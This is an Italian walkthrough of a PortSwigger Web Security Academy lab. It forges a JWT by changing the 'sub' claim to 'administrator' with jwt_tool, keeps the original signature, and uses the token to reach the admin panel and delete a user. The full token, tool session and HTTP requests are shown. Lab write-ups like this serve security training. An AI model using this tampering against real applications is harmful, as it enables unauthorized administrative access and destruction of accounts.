https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature

Come suggerisce il titolo, la web app non verifica la signature...

Accediamo con le credenziali `wiener:peter`

![](_attachment/Pasted%20image%2020250406125509.png)

Questo è il nostro token

```
Cookie: session=eyJraWQiOiJiMTliODRjZi0yZTM1LTRjNWQtYTNiYS1iZTdjOWRmMjU3NWMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mzk0MDM4NSwic3ViIjoid2llbmVyIn0.hKcp9In9Os0OMjLjNkwEUW-vhmyGTUhkcHsaBF0TaAGZpr2FH26P03Ag7BPhSqE1pkAqR75-sgq6nQAjxGEtm9Hvk0NN6LYIgWnjljEf7rZ1aa_m203g447v-3NcGRfuag5b_t1GVj-NfWhKR_L1MOX20cl7KwHkDzRZ_N_W_mdt3lRWa05U0TP852qcNDgYvix7JSzAhCzSFbd1rwAorYGsb12qL4FXuOO5THkW2Ua8EDvkv-4ZSrGndmOlQtDNZCGA8pHKAhhmVC4TuvmDTU53E1kZphq8pdJJsf5S0R2ZAl847Vsl12pn1yKqksA-L0QhHX062AgMKq57ejBODA
```

Analizzandolo con il sito https://jwt.io

![](_attachment/Pasted%20image%2020250406125547.png)

payload:

```bash
$ echo -n "eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mzk0MDM4NSwic3ViIjoid2llbmVyIn0" | base64 -d
{"iss":"portswigger","exp":1743940385,"sub":"wiener"}
```


Chiaramente con questo token non possiamo accedere a `/admin`

![](_attachment/Pasted%20image%2020250406130902.png)


uso `jwt_tool` con l'opzione `-T` per sostituire `wiener` con `administrator`

```bash
joshua@kaligra:~$ jwt_tool 'eyJraWQiOiJiMTliODRjZi0yZTM1LTRjNWQtYTNiYS1iZTdjOWRmMjU3NWMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mzk0MDM4NSwic3ViIjoid2llbmVyIn0.hKcp9In9Os0OMjLjNkwEUW-vhmyGTUhkcHsaBF0TaAGZpr2FH26P03Ag7BPhSqE1pkAqR75-sgq6nQAjxGEtm9Hvk0NN6LYIgWnjljEf7rZ1aa_m203g447v-3NcGRfuag5b_t1GVj-NfWhKR_L1MOX20cl7KwHkDzRZ_N_W_mdt3lRWa05U0TP852qcNDgYvix7JSzAhCzSFbd1rwAorYGsb12qL4FXuOO5THkW2Ua8EDvkv-4ZSrGndmOlQtDNZCGA8pHKAhhmVC4TuvmDTU53E1kZphq8pdJJsf5S0R2ZAl847Vsl12pn1yKqksA-L0QhHX062AgMKq57ejBODA' -T

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] kid = "b19b84cf-2e35-4c5d-a3ba-be7c9df2575c"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] iss = "portswigger"
[2] exp = 1743940385    ==> TIMESTAMP = 2025-04-06 13:53:05 (UTC)
[3] sub = "wiener"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 5
Please select a Key to DELETE and hit ENTER
[1] iss = portswigger
[2] exp = 1743940385
[3] sub = wiener
> 3
[1] iss = "portswigger"
[2] exp = 1743940385    ==> TIMESTAMP = 2025-04-06 13:53:05 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 3
Please enter new Key and hit ENTER
> sub
Please enter new value for sub and hit ENTER
> administrator
[1] iss = "portswigger"
[2] exp = 1743940385    ==> TIMESTAMP = 2025-04-06 13:53:05 (UTC)
[3] sub = "administrator"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_dc4ec8aff1fa1d1b4da2d03b0f1d342c - Tampered token:
[+] eyJraWQiOiJiMTliODRjZi0yZTM1LTRjNWQtYTNiYS1iZTdjOWRmMjU3NWMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mzk0MDM4NSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.hKcp9In9Os0OMjLjNkwEUW-vhmyGTUhkcHsaBF0TaAGZpr2FH26P03Ag7BPhSqE1pkAqR75-sgq6nQAjxGEtm9Hvk0NN6LYIgWnjljEf7rZ1aa_m203g447v-3NcGRfuag5b_t1GVj-NfWhKR_L1MOX20cl7KwHkDzRZ_N_W_mdt3lRWa05U0TP852qcNDgYvix7JSzAhCzSFbd1rwAorYGsb12qL4FXuOO5THkW2Ua8EDvkv-4ZSrGndmOlQtDNZCGA8pHKAhhmVC4TuvmDTU53E1kZphq8pdJJsf5S0R2ZAl847Vsl12pn1yKqksA-L0QhHX062AgMKq57ejBODA
```



sostituiamo il token nel nostro Cookie:

![](_attachment/Pasted%20image%2020250406132805.png)

risposta:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3138
```

nel body troviamo:

```html
                       <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
```

inviamo dunque questa richiesta:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a7e007403d26ce480b6dffa002500f8.web-security-academy.net
Cookie: session=eyJraWQiOiJiMTliODRjZi0yZTM1LTRjNWQtYTNiYS1iZTdjOWRmMjU3NWMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mzk0MDM4NSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.hKcp9In9Os0OMjLjNkwEUW-vhmyGTUhkcHsaBF0TaAGZpr2FH26P03Ag7BPhSqE1pkAqR75-sgq6nQAjxGEtm9Hvk0NN6LYIgWnjljEf7rZ1aa_m203g447v-3NcGRfuag5b_t1GVj-NfWhKR_L1MOX20cl7KwHkDzRZ_N_W_mdt3lRWa05U0TP852qcNDgYvix7JSzAhCzSFbd1rwAorYGsb12qL4FXuOO5THkW2Ua8EDvkv-4ZSrGndmOlQtDNZCGA8pHKAhhmVC4TuvmDTU53E1kZphq8pdJJsf5S0R2ZAl847Vsl12pn1yKqksA-L0QhHX062AgMKq57ejBODA
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

risposta

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

![](_attachment/Pasted%20image%2020250406132921.png)

